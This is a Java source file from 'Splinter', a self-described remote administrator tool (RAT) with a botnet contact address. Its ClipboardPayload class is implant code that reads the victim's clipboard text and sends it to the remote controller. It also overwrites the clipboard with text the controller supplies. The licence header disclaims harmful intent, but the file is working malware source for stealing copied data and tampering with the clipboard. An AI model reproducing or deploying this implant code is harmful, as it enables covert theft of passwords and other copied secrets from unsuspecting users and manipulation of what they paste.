/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Implant.Payloads;

import Implant.Driver;
import Implant.Splinter_IMPLANT;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;

public class ClipboardPayload
{
  static Clipboard extract_clipboard = null;
  static Clipboard inject_clipboard = null;

  static StringSelection strSelection = null;
  public static final String strMyClassName = "ClipboardPayload";

  public static boolean copyClipboard(Splinter_IMPLANT terminal)
  {
    try
    {
      extract_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      Transferable clipboard_Contents = extract_clipboard.getContents(null);

      if ((extract_clipboard != null) && (clipboard_Contents.isDataFlavorSupported(DataFlavor.stringFlavor)))
      {
        terminal.sendToController(terminal.myUniqueDelimiter + "%%%%%" + "RESPONSE_CLIPBOARD" + "%%%%%" + clipboard_Contents.getTransferData(DataFlavor.stringFlavor), false, false);
      }
      else
      {
        terminal.sendToController(terminal.myUniqueDelimiter + "%%%%%" + "RESPONSE_CLIPBOARD" + "%%%%%" + " * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *", false, false);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.sop("NOPE --> Could not gain exclusive access to Clipboard");
    }

    return false;
  }

  public static String getClipboardText()
  {
    try
    {
      extract_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      Transferable clipboard_Contents = extract_clipboard.getContents(null);

      if ((extract_clipboard != null) && (clipboard_Contents.isDataFlavorSupported(DataFlavor.stringFlavor)))
      {
        return ""+clipboard_Contents.getTransferData(DataFlavor.stringFlavor);
      }

      return " * --> NO TEXT IN CLIPBOARD AT THIS TIME <-- *";
    }
    catch (Exception e)
    {
      Driver.sop("[" + Driver.getTimeStamp_Without_Date() + "] -  Unable to extract Clipboard contents...");
    }

    return " *** --> NO TEXT IN CLIPBOARD AVAILABLE <-- ***";
  }

  public static boolean injectClipboard(Splinter_IMPLANT terminal, String injection)
  {
    try
    {
      if (injection == null) {
        injection = "";
      }
      strSelection = new StringSelection(injection);
      inject_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      inject_clipboard.setContents(strSelection, null);

      terminal.sendToController(terminal.myUniqueDelimiter + "%%%%%" + "RESPONSE_CLIPBOARD" + "%%%%%" + "* * * Clipboard Injection Complete * * *", false, false);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("injectClipboard", "ClipboardPayload", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean injectClipboard(String injection)
  {
    try
    {
      if (injection == null) {
        injection = "";
      }
      strSelection = new StringSelection(injection);
      inject_clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
      inject_clipboard.setContents(strSelection, null);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("injectClipboard", "ClipboardPayload", e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}